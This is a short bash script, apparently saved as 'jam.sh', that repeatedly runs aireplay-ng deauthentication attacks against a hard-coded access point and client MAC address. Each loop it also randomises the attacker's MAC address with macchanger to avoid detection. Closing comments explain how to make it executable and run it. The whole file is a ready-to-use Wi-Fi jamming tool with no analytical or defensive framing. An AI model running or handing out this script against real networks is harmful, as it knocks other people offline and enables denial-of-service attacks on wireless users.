while true
do
        aireplay-ng -0 5 -a 90:F6:52:C1:BB:18 -c 28:BA:B5:0D:A0:24 wlp2s0
        ifconfig wlp2s0 down
        macchanger -r wlp2s0 | grep "New MAC"
        iwconfig wlp2s0 mode monitor
        ifconfig wlp2s0 up
        iwconfig wlp2s0 | grep Mode 
        sleep 3
        echo waiting!!!!!!!!
done

#chmod +x jam.sh
# ./jam.sh       to execute file in terminal